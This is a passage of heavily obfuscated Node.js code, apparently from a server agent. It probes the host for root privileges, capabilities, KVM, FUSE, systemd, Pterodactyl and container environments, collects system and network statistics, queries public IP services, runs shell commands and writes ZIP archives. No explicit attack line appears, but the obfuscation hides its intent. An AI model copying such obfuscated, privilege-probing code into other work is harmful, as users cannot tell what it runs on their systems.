            a0D['debug'](c0(0x484) + b[c0(0x624)], 0x1);
        if (a[c0(0x24d)](c[c0(0x59c)], a[c0(0x54f)]))
            a0D[c0(0x925)](c0(0x353) + c['reason'], 0x1);
        return {
            'ipv4': a[c0(0x756)](b['status'], a[c0(0x402)]) ? b['value'] : null,
            'ipv6': a[c0(0x3e9)](c['status'], a[c0(0x402)]) ? c[c0(0x27b)] : null
        };
    }
    static [a0aY(0x8d0)] = a0aY(0x563);
    static [a0aY(0x317)] = a0aY(0x248);
    static ['MARKS_ETC_ROOT'] = a0aY(0x22b);
    static [a0aY(0x5db)] = a0aY(0x7bf);
    static ['MARKS_ROOT'] = '/';
    [a0aY(0x65d)]() {
        const c1 = a0aY, a = {
                'bCJgV': function (d, f) {
                    return d !== f;
                },
                'mJstr': 'linux',
                'fOSfJ': c1(0x5d2),
                'LcqSf': c1(0xf6),
                'qkZEU': function (d) {
                    return d();
                },
                'lPIbf': c1(0x74c)
            };
        if (a[c1(0x8b1)](process[c1(0x7ac)], a['mJstr']))
            return [];
        const b = [], c = [
                [
                    'root',
                    () => this['_markRoot']()
                ],
                [
                    a[c1(0x506)],
                    () => this[c1(0x201)]()
                ],
                [
                    c1(0x244),
                    () => this[c1(0x79f)]()
                ],
                [
                    c1(0x4fc),
                    () => this['_markSystemd']()
                ],
                [
                    a[c1(0x26c)],
                    () => this['_markFuse']()
                ]
            ];
        for (const [d, f] of c) {
            try {
                if (a[c1(0x416)](f))
                    b[c1(0x75e)](d);
            } catch (g) {
                a0D['debug'](c1(0x349) + d + c1(0x566) + g[c1(0x49d)], 0x1);
            }
        }
        return a0D[c1(0x925)](c1(0x269) + (b[c1(0x52c)](',') || a['lPIbf']), 0x1), b;
    }
    [a0aY(0x917)]() {
        const c2 = a0aY, a = {
                'UEfaZ': function (b, c) {
                    return b !== c;
                },
                'RpXcR': 'function',
                'xZgQw': function (b, c) {
                    return b === c;
                }
            };
        if (a[c2(0x683)](typeof process[c2(0x189)], a[c2(0x176)]) || typeof process[c2(0x623)] !== a[c2(0x176)])
            return ![];
        return process[c2(0x189)]() === 0x0 && a[c2(0x6b3)](process['getegid'](), 0x0);
    }
    ['_markKvm']() {
        const c3 = a0aY;
        return a0U['_charDeviceRW'](a0o[c3(0x52c)](a0U[c3(0x317)], c3(0x5d2)), 0xa, 0xe8);
    }
    ['_markFuse']() {
        const c4 = a0aY, a = {
                'jYnRG': 'usr/bin/fusermount3',
                'mxoJW': 'usr/bin/fusermount',
                'piZyQ': c4(0x270),
                'qYHbM': function (b, c) {
                    return b & c;
                }
            };
        if (!a0U[c4(0x4bf)](a0o['join'](a0U[c4(0x317)], c4(0xf6)), 0xa, 0xe5))
            return ![];
        if (this[c4(0x3d7)](0x15))
            return !![];
        for (const b of [
                a[c4(0x24a)],
                c4(0x3ed),
                a[c4(0x472)],
                a[c4(0x2c7)]
            ]) {
            try {
                const c = a0l[c4(0x479)](a0o[c4(0x52c)](a0U[c4(0x3f9)], b));
                if (c['isFile']() && a[c4(0x4d0)](c['mode'], 0x800) && a[c4(0x4d0)](c[c4(0x2d4)], 0x49))
                    return !![];
            } catch {
            }
        }
        return ![];
    }
    ['_markPterodactyl']() {
        const c5 = a0aY, a = {
                'cbHyI': c5(0x633),
                'wQPwi': 'mountinfo',
                'Crcwb': 'utf8',
                'MKYTp': c5(0x401),
                'jPhBo': function (g, h) {
                    return g !== h;
                },
                'vmFdi': c5(0x373),
                'qCLJH': function (g, h) {
                    return g > h;
                },
                'dWwBw': function (g, h) {
                    return g === h;
                },
                'jEBOX': function (g, h) {
                    return g(h);
                },
                'QSseg': c5(0x35a)
            };
        if (a0U[c5(0x4e3)](a0o[c5(0x52c)](a0U['MARKS_PROC_ROOT'], a[c5(0x7b7)], a['wQPwi']), Buffer['from'](c5(0x5c9))))
            return !![];
        for (const g of [
                a[c5(0x7b7)],
                '1'
            ]) {
            const h = a0U[c5(0x6a8)](a0o[c5(0x52c)](a0U[c5(0x8d0)], g, c5(0x274)));
            if (!h)
                continue;
            const i = h['toString'](a[c5(0x10a)])[c5(0x140)]('\x00'), j = i[c5(0x190)](l => l[c5(0x627)](c5(0x36a))), k = i[c5(0x190)](l => l['startsWith'](c5(0x7aa)));
            if (j && k)
                return !![];
        }
        const b = a0U[c5(0x6a8)](a0o[c5(0x52c)](a0U['MARKS_ETC_ROOT'], c5(0x4c1)));
        if (!b)
            return ![];
        const c = b[c5(0x491)](a['Crcwb'])[c5(0x63e)]()['toLowerCase']();
        if (!/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/[c5(0x731)](c))
            return ![];
        try {
            if (!a0l['statSync'](a0o[c5(0x52c)](a0U[c5(0x3f9)], 'home', a[c5(0x230)]))[c5(0x4e4)]())
                return ![];
        } catch {
            return ![];
        }
        if (a[c5(0x704)](typeof process['geteuid'], 'function'))
            return ![];
        const d = process[c5(0x189)](), f = a0U[c5(0x6a8)](a0o[c5(0x52c)](a0U[c5(0x7ef)], a[c5(0x5c8)]));
        if (!f)
            return ![];
        for (const l of f[c5(0x491)](a[c5(0x10a)])[c5(0x140)]('\x0a')) {
            const m = l[c5(0x140)](':');
            if (a[c5(0x186)](m['length'], 0x2) && a[c5(0x7fb)](a['jEBOX'](Number, m[0x2]), d))
                return ![];
        }
        return a0l[c5(0x383)](a0o[c5(0x52c)](a0U['MARKS_ROOT'], c5(0x3ab))) || a0l[c5(0x383)](a0o['join'](a0U[c5(0x5db)], a[c5(0x888)]));
    }
    ['_markSystemd']() {
        const c6 = a0aY, a = {
                'kqtNS': 'systemd',
                'lWosO': c6(0x665),
                'JjniX': c6(0x408),
                'yrKEm': 'comm',
                'ZKnVr': 'utf8',
                'mdsZe': c6(0x8d5)
            };
        try {
            if (!a0l[c6(0x479)](a0o[c6(0x52c)](a0U[c6(0x5db)], a[c6(0x3dd)], a['lWosO']))[c6(0x4e4)]())
                return ![];
        } catch {
            return ![];
        }
        if (!a0l['existsSync'](a0o[c6(0x52c)](a0U[c6(0x5db)], a['kqtNS'], c6(0x59e))) && !a0l[c6(0x383)](a0o[c6(0x52c)](a0U[c6(0x5db)], a['JjniX'], c6(0x691))))
            return ![];
        if (!a0U['_systemctlLocatable']())
            return ![];
        const b = a0U[c6(0x6a8)](a0o['join'](a0U[c6(0x8d0)], '1', a[c6(0x739)]));
        if (b) {
            const c = b[c6(0x491)](a[c6(0x6a4)])[c6(0x63e)]();
            if (c)
                return c[c6(0x1a2)]()[c6(0x4f6)](a[c6(0x3dd)]);
        }
        try {
            const d = a0l[c6(0x175)](a0o[c6(0x52c)](a0U[c6(0x8d0)], '1', a[c6(0x122)]));
            if (d && !a0o[c6(0x8df)](d)[c6(0x1a2)]()[c6(0x4f6)](a['kqtNS']))
                return ![];
        } catch {
        }
        return !![];
    }
    ['_capEffBit'](a) {
        const c7 = a0aY, b = {
                'hTxfM': c7(0x59c),
                'wHOSW': c7(0x3ef),
                'zqkBK': c7(0x5d4),
                'VzCgG': function (d, f) {
                    return d === f;
                },
                'oxeql': function (d, f) {
                    return d & f;
                },
                'WCFgy': function (d, f) {
                    return d >> f;
                },
                'MimPe': function (d, f) {
                    return d(f);
                },
                'iQOiW': function (d, f) {
                    return d + f;
                }
            }, c = a0U['_readLimited'](a0o['join'](a0U[c7(0x8d0)], 'self', b[c7(0x121)]));
        if (!c)
            return ![];
        for (const d of c[c7(0x491)](b[c7(0x67e)])[c7(0x140)]('\x0a')) {
            if (d[c7(0x627)](b[c7(0x4a6)])) {
                const f = d[c7(0x140)](/\s+/);
                if (f['length'] < 0x2)
                    return ![];
                try {
                    return b[c7(0x7dd)](b['oxeql'](b[c7(0x492)](b[c7(0x63a)](BigInt, b['iQOiW']('0x', f[0x1])), b[c7(0x63a)](BigInt, a)), 0x1n), 0x1n);
                } catch {
                    return ![];
                }
            }
        }
        return ![];
    }
    static ['_systemctlLocatable']() {
        const c8 = a0aY, a = {
                'hhPNR': 'usr/bin/systemctl',
                'rpSMa': 'bin/systemctl',
                'gGVlM': 'usr/local/bin/systemctl',
                'CxOjQ': c8(0x89c)
            };
        for (const b of [
                a[c8(0x66e)],
                a[c8(0x10e)],
                a[c8(0x16f)]
            ]) {
            if (a0U[c8(0x3ca)](a0o[c8(0x52c)](a0U[c8(0x3f9)], b)))
                return !![];
        }
        for (const c of (process.env.PATH || '')[c8(0x140)](a0o['delimiter'])) {
            if (c && a0U[c8(0x3ca)](a0o[c8(0x52c)](c, a[c8(0x2ea)])))
                return !![];
        }
        return ![];
    }
    static [a0aY(0x3ca)](a) {
        const c9 = a0aY, b = {
                'TEolJ': function (c, d) {
                    return c !== d;
                },
                'svqaN': function (c, d) {
                    return c & d;
                }
            };
        try {
            const c = a0l[c9(0x479)](a);
            return c[c9(0x34d)]() && b[c9(0x77f)](b[c9(0x22d)](c[c9(0x2d4)], 0x49), 0x0);
        } catch {
            return ![];
        }
    }
    static [a0aY(0x4bf)](a, b, c) {
        const ca = a0aY, d = {
                'iAirC': function (f, g) {
                    return f !== g;
                }
            };
        try {
            const f = a0l[ca(0x479)](a);
            if (!f[ca(0x1f8)]())
                return ![];
            if (d[ca(0xf4)](a0U[ca(0x603)](f[ca(0x365)]), b) || a0U[ca(0x115)](f[ca(0x365)]) !== c)
                return ![];
            const g = a0l[ca(0x44f)](a, 'r+');
            try {
                return !![];
            } finally {
                a0l[ca(0x92f)](g);
            }
        } catch {
            return ![];
        }
    }
    static [a0aY(0x603)](a) {
        const cb = a0aY, b = {
                'fieDy': function (f, g) {
                    return f % g;
                },
                'WUdBV': function (f, g) {
                    return f / g;
                },
                'uytvm': function (f, g) {
                    return f >>> g;
                },
                'phhmf': function (f, g) {
                    return f | g;
                },
                'hdCtF': function (f, g) {
                    return f & g;
                }
            }, c = b[cb(0x2b3)](Math['floor'](b[cb(0x5ff)](a, 0x100)), 0x1000), d = Math['floor'](a / 0x100000000);
        return b[cb(0x30d)](b[cb(0x4ae)](c, b[cb(0x476)](d, ~0xfff)), 0x0);
    }
    static [a0aY(0x115)](a) {
        const cc = a0aY, b = {
                'tDEcV': function (f, g) {
                    return f % g;
                },
                'lOeFg': function (f, g) {
                    return f & g;
                },
                'CWWsG': function (f, g) {
                    return f / g;
                },
                'YGBkT': function (f, g) {
                    return f >>> g;
                },
                'YDORd': function (f, g) {
                    return f | g;
                }
            }, c = b[cc(0x313)](a, 0x100), d = b['lOeFg'](Math[cc(0x29f)](b[cc(0x250)](a, 0x1000)) % 0x100000, 0xfff00);
        return b[cc(0x184)](b['YDORd'](c, d), 0x0);
    }
    static [a0aY(0x6a8)](a, b = 0x400 * 0x400) {
        const cd = a0aY, c = {
                'FZcbr': function (f, g) {
                    return f < g;
                },
                'LomXz': function (f, g) {
                    return f - g;
                }
            };
        let d = null;
        try {
            d = a0l['openSync'](a, 'r');
            const f = Buffer[cd(0x744)](0x2000), g = [];
            let h = 0x0;
            while (c['FZcbr'](h, b)) {
                const i = a0l[cd(0x616)](d, f, 0x0, Math[cd(0x5df)](f[cd(0x7a3)], c[cd(0x308)](b, h)), null);
                if (!i)
                    break;
                g['push'](Buffer[cd(0x68c)](f['subarray'](0x0, i))), h += i;
            }
            return Buffer[cd(0x322)](g);
        } catch {
            return null;
        } finally {
            if (d !== null)
                try {
                    a0l[cd(0x92f)](d);
                } catch {
                }
        }
    }
    static [a0aY(0x4e3)](a, b, c = 0x400 * 0x400, d = 0x2000) {
        const ce = a0aY, f = {
                'Rrqzb': function (h, i) {
                    return h - i;
                },
                'DxIBP': function (h, i) {
                    return h < i;
                },
                'NNRMP': function (h, i) {
                    return h !== i;
                },
                'GWDAR': function (h, i) {
                    return h - i;
                },
                'VVyqI': function (h, i) {
                    return h !== i;
                }
            };
        let g = null;
        try {
            g = a0l[ce(0x44f)](a, 'r');
            const h = Math[ce(0x434)](0x0, f['Rrqzb'](b[ce(0x7a3)], 0x1)), i = Buffer[ce(0x744)](d);
            let j = Buffer[ce(0x744)](0x0), k = 0x0;
            while (f[ce(0x77e)](k, c)) {
                const l = a0l[ce(0x616)](g, i, 0x0, Math[ce(0x5df)](d, f[ce(0x866)](c, k)), null);
                if (!l)
                    break;
                k += l;
                const m = Buffer[ce(0x322)]([
                    j,
                    i[ce(0x16b)](0x0, l)
                ]);
                if (f['NNRMP'](m[ce(0x5b4)](b), -0x1))
                    return !![];
                j = h ? Buffer[ce(0x68c)](m[ce(0x16b)](Math[ce(0x434)](0x0, f[ce(0x195)](m['length'], h)))) : Buffer[ce(0x744)](0x0);
            }
            return ![];
        } catch {
            return ![];
        } finally {
            if (f[ce(0x8fa)](g, null))
                try {
                    a0l['closeSync'](g);
                } catch {
                }
        }
    }
    ['getLocalIPv4']() {
        const cf = a0aY, a = {
                'ScVdD': function (c, d) {
                    return c === d;
                },
                'fEeGH': cf(0x5a2),
                'Ldmzh': function (c, d) {
                    return c === d;
                }
            }, b = a0p[cf(0x91b)]();
        for (const c of Object[cf(0x84b)](b)) {
            for (const d of b[c]) {
                const f = a[cf(0x370)](d[cf(0x7c1)], a[cf(0x35d)]) || a[cf(0x2bb)](d[cf(0x7c1)], 0x4);
                if (f && !d[cf(0x358)]) {
                    if (!/^10\./[cf(0x731)](d['address']) && !/^192\.168\./[cf(0x731)](d[cf(0x11a)]) && !/^172\.(1[6-9]|2[0-9]|3[0-1])\./[cf(0x731)](d[cf(0x11a)]))
                        return d[cf(0x11a)];
                }
            }
        }
        return null;
    }
    async ['getPublicIpV4']() {
        const cg = a0aY, a = {
                'NaKDm': cg(0x3a8),
                'azSzj': cg(0x3a3),
                'RnFqr': cg(0x3cb),
                'tbXjy': cg(0x7c5),
                'Andsj': 'https://myexternalip.com/raw'
            }, b = [
                cg(0x547),
                a[cg(0x24c)],
                a[cg(0x25c)],
                a['RnFqr'],
                'https://ipecho.net/plain',
                a[cg(0x805)],
                a[cg(0x88a)]
            ];
        for (const d of b) {
            try {
                const f = await this[cg(0x17c)](d, 0x4);
                if (f && this[cg(0x57c)](f))
                    return f;
            } catch (g) {
                continue;
            }
        }
        const c = this['getLocalIPv4']();
        if (c && this[cg(0x57c)](c))
            return c;
        return null;
    }
    [a0aY(0x72d)]() {
        const ch = a0aY, a = {
                'uIULl': function (c, d) {
                    return c === d;
                },
                'XRPvp': 'IPv6'
            }, b = a0p['networkInterfaces']();
        for (const c of Object[ch(0x84b)](b)) {
            for (const d of b[c]) {
                const f = a[ch(0x34f)](d['family'], a['XRPvp']) || a[ch(0x34f)](d['family'], 0x6);
                if (f && !d['internal']) {
                    if (!d['address']['toLowerCase']()[ch(0x627)]('fe80:'))
                        return d[ch(0x11a)];
                }
            }
        }
        return null;
    }
    async [a0aY(0x4a5)]() {
        const ci = a0aY, a = {
                'NflfO': ci(0x17b),
                'HFKjr': ci(0x3a8),
                'ieWsA': ci(0x685)
            }, b = this[ci(0x72d)]();
        if (b && this[ci(0x1ec)](b))
            return b;
        const c = [
            a[ci(0x381)],
            a[ci(0x1d5)],
            a[ci(0x161)]
        ];
        for (const d of c) {
            try {
                const f = await this[ci(0x17c)](d, 0x6);
                if (f && this[ci(0x1ec)](f))
                    return f;
            } catch (g) {
                a0D[ci(0x925)](ci(0x62e) + d + ci(0x780) + g[ci(0x49d)]);
                continue;
            }
        }
        return null;
    }
    async [a0aY(0x17c)](a, b = 0x0) {
        const cj = a0aY, c = {
                'zOaAi': function (d, f) {
                    return d(f);
                },
                'QeYwI': function (d, f) {
                    return d(f);
                },
                'ZjJja': cj(0x52d),
                'zCgdh': cj(0x28b),
                'EaNCR': cj(0x8e9)
            };
        return new Promise((d, f) => {
            const ck = cj, g = {
                    'Erjwq': function (k, l) {
                        return k(l);
                    },
                    'odsPD': 'data',
                    'aoPBg': 'end'
                }, h = c[ck(0x544)](require, c[ck(0x4d6)]), i = {
                    'timeout': 0x1388,
                    'family': b,
                    'headers': { 'Accept': c[ck(0x509)] }
                }, j = h[ck(0x1f2)](a, i, k => {
                    const cl = ck;
                    let l = '';
                    if (k[cl(0x7d8)] !== 0xc8) {
                        g[cl(0x6ba)](f, new Error(cl(0x7ff) + k[cl(0x7d8)]));
                        return;
                    }
                    k['on'](g[cl(0x7b4)], m => l += m), k['on'](g[cl(0x356)], () => d(l[cl(0x63e)]()));
                });
            j['on'](c[ck(0x66c)], f), j[ck(0x797)](0x1388, () => {
                const cm = ck;
                j[cm(0x1f0)](), c[cm(0x8be)](f, new Error(cm(0x185)));
            });
        });
    }
    [a0aY(0x57c)](a) {
        const cn = a0aY;
        return /^(\d{1,3}\.){3}\d{1,3}$/[cn(0x731)](a);
    }
    [a0aY(0x1ec)](a) {
        const co = a0aY;
        if (!/^[0-9a-fA-F:]+$/['test'](a) || !a[co(0x4f6)](':'))
            return ![];
        const b = a[co(0x140)](':')[0x0];
        return /^[23][0-9a-fA-F]{3}$/['test'](b);
    }
    async ['getRealtimeInfo']() {
        const cp = a0aY, a = {
                'kOYeC': function (m, n) {
                    return m / n;
                },
                'LGaSr': function (m, n) {
                    return m - n;
                },
                'EcYKY': function (m, n) {
                    return m - n;
                },
                'Awwtj': function (m, n) {
                    return m * n;
                }
            }, [b, c, d, f] = await Promise[cp(0x86c)]([
                a0u[cp(0x289)](),
                a0u[cp(0x3f0)](),
                a0u['networkStats'](),
                a0u[cp(0x289)]()
            ]), g = d[0x0] || {
                'tx_bytes': 0x0,
                'rx_bytes': 0x0
            }, h = a[cp(0x895)](Date['now'](), 0x3e8), i = a['LGaSr'](h, this[cp(0x12b)]), j = a[cp(0x5a7)](g[cp(0x51e)], this[cp(0x81f)]['tx']), k = a[cp(0x18d)](g[cp(0x91f)], this[cp(0x81f)]['rx']);
        this[cp(0x10f)] += j, this[cp(0x7db)] += k, this[cp(0x81f)] = {
            'tx': g['tx_bytes'],
            'rx': g[cp(0x91f)]
        }, this[cp(0x12b)] = h;
        const l = await a0u[cp(0x254)]();
        return {
            'cpu': { 'usage': Math[cp(0x7a6)](b['currentLoad']) },
            'ram': {
                'total': c['total'],
                'used': c['active']
            },
            'swap': {
                'total': c[cp(0x8a8)],
                'used': c[cp(0x862)]
            },
            'load': {
                'load1': a[cp(0x895)](Math['round'](a['Awwtj'](f[cp(0x4a1)], 0x64)), 0x64),
                'load5': Math[cp(0x7a6)](a[cp(0x48c)](f[cp(0x4a1)], 0x64)) / 0x64,
                'load15': a[cp(0x895)](Math[cp(0x7a6)](f[cp(0x4a1)] * 0x64), 0x64)
            },
            'disk': await this['_getDiskInfo'](),
            'network': {
                'up': Math[cp(0x7a6)](a[cp(0x895)](j, i)),
                'down': Math[cp(0x7a6)](k / i),
                'totalUp': this['totalNetworkUp'],
                'totalDown': this['totalNetworkDown']
            },
            'connections': await this[cp(0x26e)](),
            'uptime': a0p[cp(0x5e4)](),
            'process': l?.[cp(0x86c)] || 0x0,
            'message': ''
        };
    }
    async [a0aY(0x86b)]() {
        const cq = a0aY, a = {
                'TGviY': cq(0x3bb),
                'PMUSU': cq(0x708),
                'PzGlF': cq(0x3c8),
                'rEQlI': cq(0x2f6),
                'UZjMp': 'containerd',
                'SNpcv': cq(0x4e2),
                'DVVql': 'LXC',
                'nKyfs': cq(0x260),
                'fhsiS': cq(0x459),
                'NojKN': cq(0x642),
                'AgDVK': cq(0x1ae),
                'wDOIg': cq(0x887),
                'aMbNz': cq(0x2ad),
                'Aaddu': cq(0x611),
                'oLjIV': cq(0x3ef),
                'IzsAf': 'QEMU',
                'SzGub': cq(0x144),
                'Dfohi': cq(0x6fd)
            };
        try {
            if (a0l[cq(0x383)](cq(0x35e)))
                return a[cq(0x7af)];
            if (a0l[cq(0x383)](a['PMUSU']))
                return 'Podman';
            if (a0l[cq(0x383)](a[cq(0x556)])) {
                const b = a0l[cq(0x3ce)](a['PzGlF'], cq(0x3ef))[cq(0x1a2)]();
                if (b[cq(0x4f6)](a[cq(0x898)]) || b[cq(0x4f6)](a['UZjMp']))
                    return a[cq(0x7af)];
                else {
                    if (b[cq(0x4f6)](a['SNpcv']))
                        return cq(0x273);
                    else {
                        if (b['includes']('lxc'))
                            return a['DVVql'];
                    }
                }
            }
            if (a0l[cq(0x383)](cq(0x260))) {
                const c = a0l[cq(0x3ce)](a['nKyfs'], 'utf8');
                if (c[cq(0x4f6)](a['fhsiS']) || c[cq(0x4f6)](a[cq(0x748)]))
                    return a['TGviY'];
                else {
                    if (c[cq(0x4f6)](a[cq(0x5fa)]) || c[cq(0x4f6)](cq(0x854)))
                        return 'Kubernetes';
                }
            }
            if (a0l[cq(0x383)](a[cq(0x7d3)])) {
                const d = a0l[cq(0x3ce)](a[cq(0x7d3)], cq(0x3ef));
                if (d[cq(0x4f6)](a['aMbNz']))
                    return a[cq(0x3c9)];
            }
            if (a0l[cq(0x383)](a[cq(0x7df)])) {
                const f = a0l[cq(0x3ce)](a[cq(0x7df)], a[cq(0x54e)]);
                if (f['includes'](a[cq(0x689)]) || f[cq(0x4f6)](a['SzGub']))
                    return a['IzsAf'];
            }
        } catch (g) {
        }
        return a[cq(0x587)];
    }
    async ['_getDiskInfo']() {
        const cr = a0aY, a = {
                'HxAej': function (b, c) {
                    return b !== c;
                },
                'EXaPF': function (b, c) {
                    return b !== c;
                },
                'RwyTb': '/dev/'
            };
        try {
            const b = await a0u[cr(0x3fb)](), c = b[cr(0x896)](g => {
                    const cs = cr;
                    return g[cs(0x8fe)] > 0x0 && a['HxAej'](g[cs(0x165)], cs(0x8ee)) && a[cs(0x26b)](g[cs(0x165)], 'overlay') && g['fs'][cs(0x627)](a[cs(0x864)]);
                }), d = c[cr(0x424)]((g, h) => g + h['size'], 0x0), f = c[cr(0x424)]((g, h) => g + h['used'], 0x0);
            return {
                'total': d,
                'used': f
            };
        } catch {
            return {
                'total': 0x0,
                'used': 0x0
            };
        }
    }
    async ['_getConnections']() {
        const ct = a0aY;
        try {
            const a = await a0u[ct(0x285)](), b = a['filter'](d => d[ct(0x79b)] === 'tcp')['length'], c = a[ct(0x896)](d => d[ct(0x79b)] === ct(0x3d8))[ct(0x7a3)];
            return {
                'tcp': b,
                'udp': c
            };
        } catch {
            return {
                'tcp': 0x0,
                'udp': 0x0
            };
        }
    }
}
class a0V {
    static async [a0aY(0x6da)](a, b = {}) {
        const cu = a0aY, c = {
                'KFDhL': function (d, f) {
                    return d - f;
                },
                'HsKyo': function (d, f) {
                    return d || f;
                },
                'baxpo': function (d, f) {
                    return d(f);
                },
                'EugKV': function (d, f, g, h) {
                    return d(f, g, h);
                },
                'BYXae': function (d, f) {
                    return d * f;
                }
            }, {
                cwd: cwd = process[cu(0x133)](),
                env: env = {},
                timeout: timeout = a0P[cu(0x351)]
            } = b;
        return new Promise(d => {
            const cv = cu, f = Date['now'](), g = c[cv(0x7bb)](a0r, a, {
                    'cwd': cwd,
                    'env': {
                        ...process.env,
                        ...env
                    },
                    'timeout': c[cv(0x456)](timeout, 0x3e8),
                    'maxBuffer': c[cv(0x456)](0xa * 0x400, 0x400)
                }, (h, i, j) => {
                    const cw = cv, k = c[cw(0x816)](Date[cw(0x855)](), f), l = h && h[cw(0x802)] && h['signal'];
                    let m = c['HsKyo'](i, '');
                    if (j)
                        m += j;
                    let n = 0x0;
                    if (h) {
                        if (l)
                            n = 0x7c;
                        else
                            typeof h[cw(0x4dd)] === 'number' ? n = h[cw(0x4dd)] : n = -0x1;
                    }
                    c['baxpo'](d, {
                        'result': m,
                        'exitcode': n,
                        'timeout': l,
                        'cmd': a
                    });
                });
        });
    }
}
function a0W(a) {
    const cx = a0aY;
    try {
        const b = a0l[cx(0x6c9)][cx(0x5c7)](a0o['resolve'](a0P[cx(0x724)])), c = a0o[cx(0x928)](a);
        let d = c;
        while (!a0l['existsSync'](d)) {
            const i = a0o['dirname'](d);
            if (i === d)
                return ![];
            d = i;
        }
        const f = a0l['realpathSync'][cx(0x5c7)](d), g = a0o[cx(0x66f)](b, f);
        if (g[cx(0x627)]('..') || a0o[cx(0x798)](g))
            return ![];
        const h = a0o[cx(0x66f)](d, c);
        if (h && (h[cx(0x627)]('..') || a0o['isAbsolute'](h)))
            return ![];
        return !![];
    } catch (j) {
        return ![];
    }
}
class a0X {
    static ['ZIP_MAX_ENTRIES'] = 0x4e20;
    static [a0aY(0x2b7)] = 0x200 * 0x400 * 0x400;
    static [a0aY(0x90e)] = 0x1f4;
    static [a0aY(0x38c)] = null;
    static [a0aY(0x71d)](a) {
        const cy = a0aY, b = {
                'cYOWg': function (g, h) {
                    return g < h;
                },
                'CXTkU': function (g, h) {
                    return g >>> h;
                },
                'QRHLH': function (g, h) {
                    return g ^ h;
                },
                'fTHJF': function (g, h) {
                    return g >>> h;
                }
            };
        if (!a0X[cy(0x38c)]) {
            const g = new Int32Array(0x100);
            for (let h = 0x0; h < 0x100; h++) {
                let j = h;
                for (let l = 0x0; b[cy(0x138)](l, 0x8); l++)
                    j = j & 0x1 ? 0xedb88320 ^ b[cy(0x2a8)](j, 0x1) : b['CXTkU'](j, 0x1);
                g[h] = j;
            }
            a0X[cy(0x38c)] = g;
        }
        const d = a0X['_crcTable'];
        let f = -0x1;
        for (let m = 0x0; m < a[cy(0x7a3)]; m++)
            f = b[cy(0x719)](b[cy(0x641)](f, 0x8), d[(f ^ a[m]) & 0xff]);
        return (f ^ -0x1) >>> 0x0;
    }
    static [a0aY(0x3aa)](a) {
        const cz = a0aY, b = {
                'gUMxd': function (g, h) {
                    return g & h;
                },
                'XxoEp': function (g, h) {
                    return g | h;
                },
                'wNSpt': function (g, h) {
                    return g << h;
                },
                'DIxDH': function (g, h) {
                    return g >> h;
                },
                'axpMC': function (g, h) {
                    return g & h;
                },
                'RPfvZ': function (g, h) {
                    return g << h;
                },
                'frLfu': function (g, h) {
                    return g - h;
                },
                'NRfOw': function (g, h) {
                    return g + h;
                }
            }, c = b['gUMxd'](b['XxoEp'](a[cz(0x767)]() << 0xb | b['wNSpt'](a['getMinutes'](), 0x5), b[cz(0x33a)](a[cz(0x8e3)](), 0x1)), 0xffff), f = b[cz(0x205)](b[cz(0x8ea)](b[cz(0x8ea)](b[cz(0x734)](b[cz(0x681)](a[cz(0x696)](), 0x7bc), 0x9), b[cz(0x734)](b[cz(0x653)](a[cz(0x5af)](), 0x1), 0x5)), a[cz(0x1aa)]()), 0xffff);
        return {
            'time': c,
            'date': f
        };
    }
    static [a0aY(0x750)](a) {
        const cA = a0aY, b = {
                'CRDdn': function (i, j) {
                    return i < j;
                },
                'zQTCd': function (i, j) {
                    return i >= j;
                },
                'hOkUD': cA(0x3ef),
                'KDAjO': function (i, j) {
                    return i > j;
                },
                'gleaU': function (i, j) {
                    return i < j;
                },
                'oCBte': function (i, j) {
                    return i(j);
                },
                'qZjGX': function (i, j) {
                    return i + j;
                },
                'RqNhR': function (i, j) {
                    return i(j);
                },
                'nWsjI': function (i, j) {
                    return i(j);
                }
            }, c = a0l[cA(0x44f)](a, 'w'), d = [];
        let f = 0x0, g = 0x0;
        const h = i => {
            const cB = cA;
            let j = 0x0;
            while (b[cB(0x1c4)](j, i[cB(0x7a3)]))
                j += a0l['writeSync'](c, i, j, i[cB(0x7a3)] - j);
        };
        return {
            'add'(i, j, k, l = ![]) {
                const cC = cA;
                if (b[cC(0x3c6)](g, a0X['ZIP_MAX_ENTRIES']))
                    return ![];
                const m = Buffer[cC(0x68c)](i, b[cC(0x54a)]);
                j = j || Buffer[cC(0x744)](0x0);
                const n = l ? 0x0 : a0X[cC(0x71d)](j);
                let o = 0x0, p = j;
                if (!l && b['KDAjO'](j[cC(0x7a3)], 0x0)) {
                    const u = a0n['deflateRawSync'](j, { 'level': 0x6 });
                    b[cC(0x92d)](u['length'], j[cC(0x7a3)]) && (o = 0x8, p = u);
                }
                const {
                        time: q,
                        date: r
                    } = a0X['_dosDateTime'](k || new Date()), s = Buffer[cC(0x744)](0x1e);
                s[cC(0x873)](0x4034b50, 0x0), s[cC(0x118)](0x14, 0x4), s['writeUInt16LE'](0x800, 0x6), s[cC(0x118)](o, 0x8), s[cC(0x118)](q, 0xa), s[cC(0x118)](r, 0xc), s[cC(0x873)](n, 0xe), s[cC(0x873)](p[cC(0x7a3)], 0x12), s['writeUInt32LE'](j[cC(0x7a3)], 0x16), s[cC(0x118)](m[cC(0x7a3)], 0x1a), s[cC(0x118)](0x0, 0x1c), b['oCBte'](h, s), b[cC(0x2dc)](h, m), b[cC(0x2dc)](h, p);
                const t = Buffer['alloc'](0x2e);
                return t[cC(0x873)](0x2014b50, 0x0), t['writeUInt16LE'](0x14, 0x4), t['writeUInt16LE'](0x14, 0x6), t[cC(0x118)](0x800, 0x8), t['writeUInt16LE'](o, 0xa), t[cC(0x118)](q, 0xc), t[cC(0x118)](r, 0xe), t['writeUInt32LE'](n, 0x10), t[cC(0x873)](p[cC(0x7a3)], 0x14), t[cC(0x873)](j[cC(0x7a3)], 0x18), t[cC(0x118)](m['length'], 0x1c), t[cC(0x118)](0x0, 0x1e), t[cC(0x118)](0x0, 0x20), t['writeUInt16LE'](0x0, 0x22), t[cC(0x118)](0x0, 0x24), t[cC(0x873)](l ? 0x10 : 0x0, 0x26), t[cC(0x873)](f, 0x2a), d[cC(0x75e)](t, m), f += b[cC(0x799)](b[cC(0x799)](0x1e, m[cC(0x7a3)]), p[cC(0x7a3)]), g++, !![];
            },
            'close'() {
                const cD = cA, i = Buffer[cD(0x322)](d), j = Buffer[cD(0x744)](0x16);
